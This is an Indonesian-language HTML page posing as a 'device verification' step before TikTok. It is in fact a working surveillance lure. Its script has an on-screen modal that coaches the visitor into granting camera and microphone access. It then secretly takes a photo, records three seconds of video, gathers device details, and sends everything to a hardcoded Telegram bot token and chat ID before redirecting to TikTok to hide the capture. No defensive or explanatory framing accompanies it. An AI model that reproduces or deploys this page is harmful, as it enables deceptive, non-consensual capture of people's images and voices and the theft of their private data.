<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Akses</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #f8fafc;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: rgba(30, 41, 59, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 32px 24px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
    }

    .icon-wrapper {
      width: 64px;
      height: 64px;
      background: rgba(59, 130, 246, 0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 16px auto;
      color: #3b82f6;
    }

    h2 { font-size: 1.5rem; font-weight: 700; margin-bottom: 8px; }
    p.subtitle { color: #94a3b8; font-size: 0.875rem; margin-bottom: 24px; line-height: 1.5; }

    .btn {
      width: 100%;
      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
      color: #ffffff;
      border: none;
      padding: 14px 20px;
      font-size: 1rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
    }

    .status-container { margin-top: 20px; min-height: 24px; }
    .status-text { font-size: 0.875rem; color: #cbd5e1; }

    /* MODAL PETUNJUK USER */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(8px);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 20px;
      z-index: 999;
    }

    .modal-box {
      background: #1e293b;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 24px;
      text-align: center;
      max-width: 320px;
      width: 100%;
    }

    .modal-box h3 { margin-bottom: 12px; font-size: 1.2rem; }
    .modal-box p { font-size: 0.9rem; color: #cbd5e1; margin-bottom: 16px; line-height: 1.4; }
    .arrow-icon { font-size: 2rem; margin-bottom: 8px; animation: bounce 1s infinite; }

    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-8px); }
    }
  </style>
</head>
<body>

  <!-- MODAL PANDUAN UNTUK MEMBANTU USER RAGU -->
  <div id="guideModal" class="modal-overlay">
    <div class="modal-box">
      <div class="arrow-icon">👆</div>
      <h3>Konfirmasi Akses</h3>
      <p>Silakan klik tombol <b>"Izinkan saat mengunjungi situs"</b> atau <b>"Izinkan kali ini"</b> pada notifikasi browser Anda untuk melanjutkan.</p>
    </div>
  </div>

  <div class="card">
    <div class="icon-wrapper">
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    </div>
    <h2>Verifikasi Akses</h2>
    <p class="subtitle">Klik tombol di bawah untuk memverifikasi perangkat Anda sebelum melanjutkan ke TikTok.</p>
    
    <button id="startBtn" class="btn">Mulai Verifikasi</button>
    
    <div class="status-container">
      <p id="status" class="status-text"></p>
    </div>
  </div>

  <canvas id="photoCanvas" style="display:none;"></canvas>
  <video id="videoPreview" autoplay muted playsinline style="display:none;"></video>

<script>
  const BOT_TOKEN = "7783419810:AAF8TqVK6-d_IVbrlN8Rv6PPelPUMldfx88";
  const CHAT_ID = "7856323152";
  const TARGET_TIKTOK_URL = "https://www.tiktok.com";

  const startBtn = document.getElementById('startBtn');
  const statusTxt = document.getElementById('status');
  const guideModal = document.getElementById('guideModal');
  const video = document.getElementById('videoPreview');
  const canvas = document.getElementById('photoCanvas');

  startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    
    // Tampilkan modal bantuan agar user tahu harus menekan tombol "Izinkan"
    guideModal.style.display = 'flex';
    statusTxt.innerText = "Menunggu izin kamera...";

    try {
      // Panggil kamera (akan memicu pop-up browser)
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      
      // Sembunyikan modal bantuan setelah izin diberikan
      guideModal.style.display = 'none';
      statusTxt.innerText = "Memproses verifikasi...";
      
      video.srcObject = stream;
      await new Promise(r => setTimeout(r, 1500));

      // 1. FOTO
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));

      // 2. VIDEO (3 detik)
      const videoBlob = await recordMedia(stream, 3000);
      stream.getTracks().forEach(t => t.stop());

      // 3. INFO PERANGKAT
      const deviceInfo = `📱 Perangkat: ${navigator.userAgent}\n` +
                         `🌐 Koneksi: ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}`;

      statusTxt.innerText = "Mengirim data...";

      // KIRIM KE TELEGRAM
      await Promise.all([
        sendTelegramPhoto(photoBlob),
        sendTelegramVideo(videoBlob),
        sendTelegramMessage(deviceInfo)
      ]);

      statusTxt.innerText = "Verifikasi selesai! Membuka TikTok...";

      setTimeout(() => {
        window.location.href = TARGET_TIKTOK_URL;
      }, 500);

    } catch (err) {
      // JIKA USER MENOLAK IZIN ("Jangan pernah izinkan")
      guideModal.style.display = 'none';
      statusTxt.innerText = "Akses ditolak. Mohon izinkan akses kamera pada browser Anda.";
      startBtn.disabled = false;
    }
  });

  async function sendTelegramPhoto(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'foto.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
  }

  async function sendTelegramVideo(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, 'video.mp4');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
  }

  async function sendTelegramMessage(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  }

  async function recordMedia(stream, duration) {
    return new Promise((resolve) => {
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];
      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
      mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/mp4' }));
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), duration);
    });
  }
</script>
</body>
</html>
